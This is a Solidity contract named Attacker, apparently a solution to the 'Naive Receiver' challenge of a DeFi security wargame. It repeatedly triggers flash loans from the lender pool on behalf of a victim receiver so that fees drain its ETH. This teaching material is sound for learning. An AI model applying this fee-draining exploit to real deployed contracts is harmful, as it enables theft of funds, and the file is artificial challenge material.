//SPDX-License-Identifier:MIT

pragma solidity ^0.8.16;

import {FlashLoanReceiver} from "./FlashLoanReceiver.sol";
import {NaiveReceiverLenderPool} from "./NaiveReceiverLenderPool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract Attacker {
    FlashLoanReceiver private _receiver;
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    NaiveReceiverLenderPool private _pool;

    constructor(FlashLoanReceiver receiver, NaiveReceiverLenderPool pool) {
        _receiver = receiver;
        _pool = pool;
    }

    function attack() public {
        for (uint256 i = 0; i < 10; i++) {
            _pool.flashLoan(IERC3156FlashBorrower(_receiver), ETH, 10, "");
        }
    }
}
